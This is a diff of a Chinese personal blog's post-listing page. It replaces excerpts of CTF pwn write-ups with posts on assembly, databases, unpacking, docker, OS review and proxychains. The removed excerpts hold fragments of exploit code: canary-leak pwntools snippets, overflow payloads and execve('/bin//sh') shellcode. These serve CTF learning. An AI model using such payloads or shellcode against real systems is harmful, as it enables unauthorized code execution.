@@ -157,39 +157,39 @@
     
     
     <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/04/07/leak_canary-others_babystack/">
-        <p class="h4 index-header">leak_canary-others_babystack</p>
+      <a href="/2020/01/13/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/">
+        <p class="h4 index-header">汇编基础</p>
       </a>
 
-      <a href="/2020/04/07/leak_canary-others_babystack/">
+      <a href="/2020/01/13/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/">
         
         
           
         
         <div class="index-excerpt" >
-          <div class="index-text mb-1">leak_canary-others_babystack
-Full RELRO GOT表只读
+          <div class="index-text mb-1">X86汇编基础==Intel和AT&amp;T语法区别：==
 
-s申请的是0x80，但读入0x100。并且canary在stack -0x8的地方
-先泄露canary，puts函数在输出时，只有遇到\x00才会结束，用\n覆盖canary的第一字节\x00，从而获得canary
-payload = cyclic(0x90-0x8)
+Intel操作数在前面，AT&amp;T的在后面
 
-sh.recvuntil(&quot;iaab\n&quot;)
-canary =  u64(sh.recv(7).rjust(8,&quot;\x00&quot;))
-log.success(&quot;canary------&</div>
+
+在Intel语法中：  在AT&amp;T语法中：  有一个简单的记住它们的方法: 当你面对intel语法的时候，你可以想象把等号(=)放到2个操作数中间，当面对AT&amp;T语法的时候，你可以放一个右箭头(→）到两个操作数之间。
+
+
+AT&amp;T: 寄存器名之前需要写一个百分号(%)并且在数字前面需要加上美元符($)。并用圆括号替代方括号
+AT&amp;T: 以下是一些添加到操作符后，用来表示数据形式的后缀：– q — quad (64 bits)– l — long </div>
         </div>
       </a>
 
       <div class="index-btm">
         
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-07&nbsp;&nbsp;
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-13&nbsp;&nbsp;
         
         
           <i class="iconfont icon-inbox"></i>
           
             <a href="/categories/CTF/">CTF</a>&nbsp;
           
-            <a href="/categories/CTF/buu/">buu</a>&nbsp;
+            <a href="/categories/CTF/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a>&nbsp;
           &nbsp;
         
         
@@ -201,372 +201,41 @@ log.success(&quot;canary------&</div>
     
     
     <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/04/07/Hgame/">
-        <p class="h4 index-header">Hgame</p>
+      <a href="/2020/01/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+        <p class="h4 index-header">数据库复习笔记</p>
       </a>
 
-      <a href="/2020/04/07/Hgame/">
+      <a href="/2020/01/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/">
         
         
           
         
         <div class="index-excerpt" >
-          <div class="index-text mb-1">Hgame2020Hard_AAAAA
+          <div class="index-text mb-1">第一次实验新建数据库create database stuhyy
+on 
+(
+    name = stu, 
+    filename=&#39;C:\stu_data.mdf&#39;,
+    size = 3mb,
+    maxsize = 500mb,
+    filegrowth = 10%
 
-V5在-0x31，s在-0xAC
-sh.recvuntil(&quot;Let&#39;s 0O0o\\0O0!&quot;)
-payload=&quot;a&quot;*(0xAC - 0x31)
-payload += &#39;0O0o\x00O0&#39;
-sh.send(payload)
-sh.interactive()
-One_Shot
-
-0xE0 - 0xC0之后刚好是32位，这样第
-payload = cyclic(0xE0 - 0xC0)
-sh.send(payload)
-sh.recvuntil(&quot;shot!\n&quot;</div>
+)
+log on
+(
+    name = stu_log,
+    filename = &#39;D:\stu_log.ldf&#39;,
+    size=3mb,
+    maxsize = unlimited,
+    filegrowth = 1mb
+)
+修改数据库Alter </div>
         </div>
       </a>
 
       <div class="index-btm">
         
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-07&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF/">CTF</a>&nbsp;
-          
-            <a href="/categories/CTF/Hgame/">Hgame</a>&nbsp;
-          &nbsp;
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/04/07/hello-world/">
-        <p class="h4 index-header">Hello World!</p>
-      </a>
-
-      <a href="/2020/04/07/hello-world/">
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">2019/8/3日 15：22，我的网站算是正式开通了。这里可能是我展现最真实的我的地方，也用来记录我的学习过程和学习资料。在此先感谢一下毛同学的大力鼓吹，让我搞了这个，也感谢我的学校给我报销（笑
-最近在学校的大数据班学习了在centOS搭建hadoop平台（使用java进行程序编写），最开始的是计算和管理都在一个模拟机里的伪分布式，一主一仆的也在回家后在自家电脑上完成了搭建。
-后来为了搞github和gitee备份代码，又去研究了git如何使用，以及在vscode里同步代码，现在也是可以啦~点这可以看 相关代码和操作
-为了在学校更好的敲代码（装逼），也是打算买一个豆子峡谷，装上黑苹果和cen</div>
-        </div>
-      </a>
-
-      <div class="index-btm">
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-07&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/04/07/HCNP-SEC-19.11.23/">
-        <p class="h4 index-header">HCNP-SEC-19.11.23</p>
-      </a>
-
-      <a href="/2020/04/07/HCNP-SEC-19.11.23/">
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">HCNP-SEC-19.11.23
-
-eSight网管 可管其他厂商设备，几乎都可以
-CIS可用于抵御APT攻击。它从海量数据中提取关键信息，智能可视化，还原攻击链，防御攻击
-FireHunter还原流量，在虚拟环境对网络中传输的文件进行检测
-UMA 审计上网行为
-NGFW USG9000 网络运营商，广电（超大型网络）USG6000 中大型企业
-业务随行
-S12700 整个网络核心 S9k S7k
-
-
-网络安全运维安全策略：简单，稳定，安全
-端口要加端口描述
-脚本配置
-
-
-
-
-
-监控（类似只读）
-
-
-
-
-
-
-
-
-
-
-
-
-
-QS 优先级？优先保证业务
-FW作为出口且有多条出口链路，两条链路一接</div>
-        </div>
-      </a>
-
-      <div class="index-btm">
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-07&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/%E7%BD%91%E7%BB%9C%E4%B8%93%E4%B8%9A%E7%9F%A5%E8%AF%86/">网络专业知识</a>&nbsp;
-          &nbsp;
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/04/07/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/">
-        <p class="h4 index-header">GXY_CTF_my_cannary-从零记录如何调试出来</p>
-      </a>
-
-      <a href="/2020/04/07/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/">
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">查看main
-
-进入test()
-
-看见了read，等等先
-
-judge无法反编译，查看汇编
-
-看见了xor rdx,[rbp-8]，以及上图的mov rdx, [rdx] 也就是先讲rdx指针里的数值放在rdx里，再将rdx和rbp-8的那个进行异或，一致则校验成功
-点开read的buf
-
-buf只有30字节
-再看看strings
-
-没有/bin/sh
-所以我们得先绕过栈校验，再leak libc地址，然后再system /bin/sh
-遂写poc
-from pwn import *
-sh = process(&quot;./my_cannary&quot;)
-elf = ELF(&quot</div>
-        </div>
-      </a>
-
-      <div class="index-btm">
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-07&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF/">CTF</a>&nbsp;
-          
-            <a href="/categories/CTF/%E6%AF%94%E8%B5%9B/">比赛</a>&nbsp;
-          &nbsp;
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/04/07/git%E5%90%8C%E6%AD%A5%E5%88%B0github%E5%92%8Cgitee/">
-        <p class="h4 index-header">git同步到github和gitee</p>
-      </a>
-
-      <a href="/2020/04/07/git%E5%90%8C%E6%AD%A5%E5%88%B0github%E5%92%8Cgitee/">
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">==按照此说明做下来保证可用，但我也还没完全研究透彻所以有诸多不足请多原谅==
-一、准备工作1、建立一个仓库https://gitee.com/
-2、下载githttps://git-scm.com/可以跟随这个 https://blog.csdn.net/sishen47k/article/details/80211002 安装
-二、开始操作1、创建SSHkey打开Git Bash，输入ssh-keygen -t rsa会分别提示你文件名，密码（可不设置），确认密码。一般三次回车就可以在 C:\Users\“你的用户名”.ssh 目录下就会有.pub结尾的文件，用记事本打开，复制里面的东西，</div>
-        </div>
-      </a>
-
-      <div class="index-btm">
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-07&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/%E6%95%99%E7%A8%8B/">教程</a>&nbsp;
-          &nbsp;
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/04/07/get_started_3dsctf_2016/">
-        <p class="h4 index-header">get_started_3dsctf_2016</p>
-      </a>
-
-      <a href="/2020/04/07/get_started_3dsctf_2016/">
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">二进制菜鸡的小窝的WPmprotect函数原型： int mprotect(void *addr, size_t len, int prot);
-addr 内存启始地址
-len 修改内存的长度
-prot 内存的权限
-[
-所以得到exp:
-# _*_ coding:utf-8 _*_
-from pwn import *
-elf = ELF(&#39;./get_started_3dsctf_2016&#39;)
-sh = elf.process()
-#sh = remote(&#39;node3.buuoj.cn&#39;,27037)
-
-pop3_ret = 0x804951D #为了后续再能</div>
-        </div>
-      </a>
-
-      <div class="index-btm">
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-07&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF/">CTF</a>&nbsp;
-          
-            <a href="/categories/CTF/buu/">buu</a>&nbsp;
-          &nbsp;
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/04/07/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/">
-        <p class="h4 index-header">ez_pz_hackover_2016-继续深入学习edb</p>
-      </a>
-
-      <a href="/2020/04/07/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/">
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">ez_pz_hackover_2016-继续深入学习edb
-
-
-
-
-得先绕过result的strcmp
-sh.recvuntil(&quot;&gt;&quot;)
-payload = &quot;crashme&quot;
-payload = payload.ljust(10,&quot;\x00&quot;)
-payload += cyclic(200)
-pause()
-sh.sendline(payload)
-pause时，打开edb并attach ez_pz_hackover_2016
-我常用：f8单步运行，ctrl+f9直接跳到ret，shift+f7进入函数运行
-
-
-
-一直运行到不</div>
-        </div>
-      </a>
-
-      <div class="index-btm">
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-07&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF/">CTF</a>&nbsp;
-          
-            <a href="/categories/CTF/buu/">buu</a>&nbsp;
-          
-            <a href="/categories/CTF/%E5%A4%87%E5%BF%98/">备忘</a>&nbsp;
-          &nbsp;
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/04/07/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/">
-        <p class="h4 index-header">cisco课程代码记录</p>
-      </a>
-
-      <a href="/2020/04/07/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/">
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">cisco课程代码记录不记肯定会忘记QAQ,只敲简写然后敲tab也是可以的
-enable
-configure terminal
-hostname R1加密enable secret class
-line console 0 #线路密码
-(config-line)password cisco
-(config-line)login
-(config-line)exit
-line vty 0 4 #加密密码设置
-(config-line)password class
-(config-line)login
-(config-line)exit
-service password-encrytion标语ban</div>
-        </div>
-      </a>
-
-      <div class="index-btm">
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-07&nbsp;&nbsp;
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-13&nbsp;&nbsp;
         
         
           <i class="iconfont icon-inbox"></i>
@@ -588,51 +257,366 @@ service password-encrytion标语ban</div>
     
     
     <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/04/07/ciscn_2019_s_9/">
-        <p class="h4 index-header">ciscn_2019_s_9</p>
+      <a href="/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/">
+        <p class="h4 index-header">手动脱壳</p>
       </a>
 
-      <a href="/2020/04/07/ciscn_2019_s_9/">
+      <a href="/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/">
         
         
           
         
         <div class="index-excerpt" >
-          <div class="index-text mb-1">ciscn_2019_s_9
-啥保护没开，第一时间考虑shellcode
-
-
-另外leak只有50，leak多才考虑直接走rop
-
-尝试过ret2libc,但是怎么都调不出来= =
-shellcode =&#39;&#39;&#39;
-xor    eax,eax
-push   eax
-push   0x68732f2f #//sh
-push   0x6e69622f # /bin
-mov    ebx,esp
-mov    ecx,eax
-mov    edx,eax
-mov    al,0xb
-int    0x80
-xor    eax,eax
-inc    eax
-int    0x8</div>
+          <div class="index-text mb-1">手动脱壳可分为压缩壳（常见的有UPX、北斗、ASDPack、Npack、PECompact等）和保护壳（如强壳Safengine、VMprotect、winlicense、Themida等），压缩壳作用是把程序进行体积缩小化处理，保护壳主要作用是混淆或加密代码防止他人进行逆向程序、破解程序。
+注意右面寄存器FPU的显示，当有且只有ESP和EIP为红色时，我们可以用ESP定律了
+ESP定律
+参考
+nsPack还要找到OEP，所谓的OEP，意即程序的入口点，可以用OD载入，不分析代码。
+首先已知是nSPack壳，直接用OD打开，发现pushfd和pushad两句关键句：==win下的吾爱破解版od</div>
         </div>
       </a>
 
       <div class="index-btm">
         
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-07&nbsp;&nbsp;
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-13&nbsp;&nbsp;
         
         
           <i class="iconfont icon-inbox"></i>
           
             <a href="/categories/CTF/">CTF</a>&nbsp;
           
-            <a href="/categories/CTF/buu/">buu</a>&nbsp;
+            <a href="/categories/CTF/%E5%A4%87%E5%BF%98/">备忘</a>&nbsp;
           &nbsp;
         
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <div class="col-12 col-md-12 mx-auto index-info">
+      <a href="/2020/01/13/%E4%BD%BF%E7%94%A8docker%E4%B8%BApwn%E9%A2%98%E7%9B%AE%E6%90%AD%E9%85%8D%E7%8E%AF%E5%A2%83/">
+        <p class="h4 index-header">使用docker为pwn题目搭配环境</p>
+      </a>
+
+      <a href="/2020/01/13/%E4%BD%BF%E7%94%A8docker%E4%B8%BApwn%E9%A2%98%E7%9B%AE%E6%90%AD%E9%85%8D%E7%8E%AF%E5%A2%83/">
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">为pwn题目搭配环境-docker将多个题目搭建一个docker里ubuntu *1 
+docker 安装
+docker-compose 官方文档
+giantbranch/pwn_deploy_chroot
+解决 ERROR: Couldn’t connect to Docker daemon at http+docker://localunixsocket - is it running?
+docker-compose up解决错误ERROR: Couldn’t connect to Docker daemon at http+docker://localunixsocket - is it</div>
+        </div>
+      </a>
+
+      <div class="index-btm">
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-13&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/CTF/">CTF</a>&nbsp;
+          
+            <a href="/categories/CTF/%E8%BF%90%E7%BB%B4/">运维</a>&nbsp;
+          &nbsp;
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <div class="col-12 col-md-12 mx-auto index-info">
+      <a href="/2020/01/13/%E6%B1%87%E7%BC%96%E3%80%81%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/">
+        <p class="h4 index-header">汇编、逆向工程基础</p>
+      </a>
+
+      <a href="/2020/01/13/%E6%B1%87%E7%BC%96%E3%80%81%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/">
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">原文链接：https://blog.csdn.net/qq_21508727/article/details/80559270
+单位
+
+·WORD（字） - 一个字由两个字节组成，共有16位。一个字的最大值是0FFFFh (或者是 65535d) (h代表16进制，d代表10进制)。
+·DOUBLE WORD（双字DWORD） - 一个双字包含两个字，共有32位。最大值为0FFFFFFFF (或者是 4294967295d)。
+
+
+一个16进制占4bit
+
+
+寄存器Win+Intel CPU组成的计算机通常有9个32位寄存器 (w/o 标志寄存器)。它们是：
+
+
+EAX： 累加器
+EBX： 基</div>
+        </div>
+      </a>
+
+      <div class="index-btm">
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-13&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/CTF/">CTF</a>&nbsp;
+          
+            <a href="/categories/CTF/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a>&nbsp;
+          &nbsp;
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <div class="col-12 col-md-12 mx-auto index-info">
+      <a href="/2020/01/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0/">
+        <p class="h4 index-header">操作系统复习</p>
+      </a>
+
+      <a href="/2020/01/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0/">
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">对不起我看吐了，考炸了第一章操作系统的目标方便性，有效性，可扩充性和开放性
+可扩充性：采用微内核结构 P30
+发展主要动力
+不断提高计算机资源利用率
+方便用户
+器件的更新换代
+体系结构的发展
+新的应用需求
+
+多道程序设计的基本概念利用I/O操作的空闲时间，调度B程序运行，B空闲调度C等    P8
+优缺点
+资源利用率高
+吞吐量大
+平均周转时间长
+没有交互能力
+
+==操作系统定义为:一组能有效组织和管理硬件和软件资源，合理进行调度，方便用户使用程序的集合==
+分时系统（The Sharing System）在一台主机上连接多个终端，允许多个用户同时通过终端以交互方式使用计算机，共享主机资源
+特征</div>
+        </div>
+      </a>
+
+      <div class="index-btm">
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-13&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E4%B8%93%E4%B8%9A%E5%AD%A6%E4%B9%A0/">专业学习</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/%E4%B8%93%E4%B8%9A%E5%AD%A6%E4%B9%A0/">专业学习</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <div class="col-12 col-md-12 mx-auto index-info">
+      <a href="/2020/01/13/%E5%8D%9A%E5%BC%88%E8%AE%BA/">
+        <p class="h4 index-header">博弈论</p>
+      </a>
+
+      <a href="/2020/01/13/%E5%8D%9A%E5%BC%88%E8%AE%BA/">
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">LINK《博弈圣经》博弈论的定义：我们把动物利用大自然移动的瘾魂，在决策人期待的空间里，形成三维均衡的学术理论，称为博弈论。基本概念中包括局中人、行动、信息、策略、收益、均衡和结果等。其中局中人、策略和收益是最基本要素。局中人、行动和结果被统称为博弈规则。
+Class1定义：如果一个选项得到的结果严格优于另一个选项，那么称这个选项为严格优势策略。\
+结论1：不要选择严格劣势策略
+结论2：理性的选择，使得总结果变得更坏
+改变收益，就会改变目的。
+结论3：予欲得之，必先知之\
+结论4：分析他们（对手）的收益，站在别人的立场上去分析他们会怎么做
+
+2019/8/6
+
+
+Class2博弈的要素：参与人</div>
+        </div>
+      </a>
+
+      <div class="index-btm">
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-13&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E8%AF%BE%E5%A4%96%E5%AD%A6%E4%B9%A0/">课外学习</a>&nbsp;
+          &nbsp;
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <div class="col-12 col-md-12 mx-auto index-info">
+      <a href="/2020/01/13/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E6%80%BB%E7%BB%93/">
+        <p class="h4 index-header">安洵杯线下AWD总结</p>
+      </a>
+
+      <a href="/2020/01/13/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E6%80%BB%E7%BB%93/">
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">安洵杯线下AWD总结
+
+事后BB==赛前自动提交flag脚本没有，自动化打全场脚本没有，哎。==
+线下还是很友好的，可以连接外网，伙食也很不错，但是！
+只有先黑盒测试过了自己的，拿了flag并提交了之后，才可以找主办方要ssh密码=。=并且AWD只有1道pwn题，3个web题，域渗透部分就更不必多说了，都是web，哎
+AWD规则连接的是docker服务器，所以给的都是端口
+端口列表：axx80/axx22 
+
+eg: team01-web1 10180(web) 10122(ssh) 
+eg: team18-web2 11880(web) 11822(ssh) 
+eg: team19-web3</div>
+        </div>
+      </a>
+
+      <div class="index-btm">
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-13&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E5%8F%8D%E6%80%9D%E6%80%BB%E7%BB%93/">反思总结</a>&nbsp;
+          &nbsp;
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <div class="col-12 col-md-12 mx-auto index-info">
+      <a href="/2020/01/13/Python%E4%B8%AD%E4%B8%8B%E5%88%92%E7%BA%BF%E7%9A%845%E7%A7%8D%E5%90%AB%E4%B9%89/">
+        <p class="h4 index-header">Python中下划线的5种含义</p>
+      </a>
+
+      <a href="/2020/01/13/Python%E4%B8%AD%E4%B8%8B%E5%88%92%E7%BA%BF%E7%9A%845%E7%A7%8D%E5%90%AB%E4%B9%89/">
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">在用python重写算法，学习学习算法时，一时好奇（打基础）来学习了python的下划线
+
+单前导下划线：_var            小小警示，提示只在内部使用，非public和private那种
+
+单末尾下划线：var_            解决命名冲突的问题
+
+双前导下划线：__var          防止变量在子类中被重写，只能在类内访问
+
+单下划线：_                        使用“_”来表示它只是一个临时值
+
+双前导和末尾下划线：
+__var__这个感觉有点奇怪，一个是常见的类内init，另一个则是下面这种len的写法
+
+class Linkedli</div>
+        </div>
+      </a>
+
+      <div class="index-btm">
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-13&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/python/">python</a>&nbsp;
+          
+            <a href="/categories/python/%E5%AD%A6%E4%B9%A0/">学习</a>&nbsp;
+          &nbsp;
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <div class="col-12 col-md-12 mx-auto index-info">
+      <a href="/2020/01/13/Proxychains/">
+        <p class="h4 index-header">Proxychains</p>
+      </a>
+
+      <a href="/2020/01/13/Proxychains/">
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">折腾两小时，不如问一下人= =
+Proxychains
+先安装
+然后sudo vi /etc/proxychains.conf
+socks5 win_ip 1080
+win_ip为你的windows主机ip，可在cmd ifconfig查看
+飞机要打开允许局域网连接
+
+然后运行测试
+proxychains4 telnet www.google.com 443
+可以之后就可以直接sudo proxychains4 apt-get update了
+</div>
+        </div>
+      </a>
+
+      <div class="index-btm">
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-13&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/Linux%E4%BD%BF%E7%94%A8/">Linux使用</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/Linux-%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/">Linux 问题解决</a>&nbsp;
+          
         
       </div>
     </div>
